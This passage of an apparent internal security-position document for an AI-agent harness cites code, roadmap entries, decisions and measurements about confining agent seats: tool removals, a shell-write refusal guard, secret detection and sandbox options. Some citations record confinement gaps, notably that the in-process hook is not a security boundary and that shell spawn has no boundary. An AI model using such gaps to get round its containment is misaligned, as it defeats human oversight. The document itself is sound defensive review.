  `git rev-parse --short=12 HEAD` → `294e1806fd21`; `git status --short` → empty. Re-measurement pass
  (2026-11-06T02:38Z, branch `item-4829` @`96f810f1`, main tip `fca4e980`): registry selection → exit 0 with the
  linux/`bash` verdict above; `grep -c -E 'shellregistry|seatShellSelection' tools/channel-preflight.mjs` → **0**
  (exit 1); loopback TCP reach → 8080 REACHABLE, 47832 ECONNREFUSED.
- `src/confine.mjs:204-205, 228-311, 340-353, 364-365, 370-378, 491-493, 680-694, 712-715` ·
  `src/writetargets.mjs` header + `writeTargets` (`:152`) · `src/seatguard.mjs:455-525` (beforeTool chain,
  `shellWriteRefusal`), `:528-531` (`durig.guard`, `defineExtension`) · `src/seattools.mjs:241-276`
  (`VERIFIER_REMOVALS`, `COORDINATOR_REMOVALS`, `toolRemovalsFor`), `:294-311` (`makeSeatEnv`, fail-closed,
  #1465 `.durig` read-only root) · `src/config.mjs:82-89` (`looksLikeSecret`), `:117`, `:484`
  (`DURIG_EXTENSIONS`) · `src/extensions.mjs:6-16, 19-21, 26-31, 88-100` · `src/provenance.mjs:21-23, 79-90`.
- `docs/ROADMAP.md`: **118** at `:725`, **60** at `:2165`, **132** at `:2201`, **167** at `:2991`-region,
  **170–174** at `:2966-3001` (incl. the 2026-11-05 amendment re-sequencing 174), **268–273** at
  `:5458-5589`.
- `docs/reviews/zero-trust-zero-agent-research.md:11` (in-process hook is an integrity control, **not** a
  security boundary; smallest real boundary = spawn wrapper; egress differs by platform), `:13` (`audit2allow`
  rejected), `:64-66` (`policy_rev`, `permissive` ≠ off, labels recomputed at spawn), `:76-89` (adopt/reject
  table incl. Landlock ABI v4 and AppContainer rejection), `:112-121` (failure catalogue), `:133` (enforcement
  inventory: shell spawn has **no** boundary, reaping only), `:153-160` (platform matrix), `:173-176` (the
  report's own backlog proposals), `:186-193` (its could-not-verify list).
  **Citation-integrity note, flagged not silently accepted:** that §5 table numbers its proposals
  `171/172/173/174`, which do **not** match the minted rows (minted: 171 = the position, 172 = identity+audit,
  173 = policy as data, 174 = OS backstop; the report's 171 ≈ 173, 172 ≈ 269, 173 ≈ 174, 174 ≈ 268's egress
  half). Relabel those four rows to the minted ids (or mark them "proposal N, not a minted id") in the same
  commit that lands 270's invariant, or every later cross-reference inherits the ambiguity.
- `docs/VENDOR-PINS.md:62, 64, 77` (`agent-governance-toolkit @ a918f763` moved past our review;
  `awesome-agent-sandboxes @ db6ffc0a` **NO LICENSE FILE**; `sandbox-sdk @ 61cac81b` Apache-2.0),
  `tools/vendor-pins.mjs --check` → PASS at 17 clones (delegate-run 2026-11-05; not re-run in my worktree, which
  has no `vendor/` — stated as briefed-not-observed).
- `src/shellregistry.mjs` — `selectSeatShell(host = {})`, the selection exported at `:179`, and its own claim that
  "every consumer (CLI, broker, audit, preflight) reads the same object"; `src/seattools.mjs:214-232` (the host-
  conditional seat shell comes from that one registry, #4849 / ROADMAP 217); `tools/channel-preflight.mjs:220`
  (imports the tool NAME only), `:234` (the Windows fallback pair), `:468` (the §7 verdict G11 refutes);
  `vendor/pi-main/packages/durable/src/tools/bash.ts:169` (`options?.programs ?? ["pwsh", "powershell"]`) — read
  from the **shared checkout's** `vendor/`, which this item worktree does not carry (80-package set), so that line
  reference is named as read-not-re-runnable-here; the two `tools/channel-preflight.mjs` lines above **are** re-
  runnable here and are the load-bearing ones.
- `docs/NEXT.md:146-152` (the `0.0.0.0:47832` share, its 401/200 bearer behaviour, and the runtime-only firewall
  rule) — the **bearer behaviour is cited, not probed by me**; the **port itself I did probe**, 2026-11-06 at
  loopback: ECONNREFUSED, i.e. nothing listens today, so the figure must be re-measured before it is asserted.
- `docs/DECISIONS.md`: **D131** at `:4386` (Linux is the rig's OS; the measured host), **D141** at `:4818`
  (substrate before memory; security precedes), **D48** at `:1292` (shared-tree safety is structural);
  cross-family verification is D48/D119 discipline.
- Method and its Verify step: `docs/runbooks/security-trust-boundary-review.md` (the four anchors + `Threat
  model`; secret-scan-first; findings need severity + exploit path + fix; route adoption to lead/pm). Prior
  positions in this shape: `security-codemode-position.md`, `security-sec-broker-socket.md`,
  `security-shell-root-parity.md`.
- Queue rows this position rules on: #4829 (this), #4833 (decomposition, held behind it), #4827 (memory write-gate
  position, separate), #4922 (redactor hazard, F6), #4940 (the `seat-host-unaware` finding's remedy — adjacent:
  it is about a host *declaration* with a real consumer, which is exactly what a per-claim sandbox needs, so
  270's invariant doc and 174's spawn seam should share the host datum). Rows about the same host datum, kept
  separate on purpose: **#5132/#5133** (fix the preflight instrument — the CODE change, not this paper), **#5163**
  (its root cause and the programs-pinning demo), **#5160** (the release ruling that opened this row), **#5152**
  (the 171–174 decomposition, which this row gates).
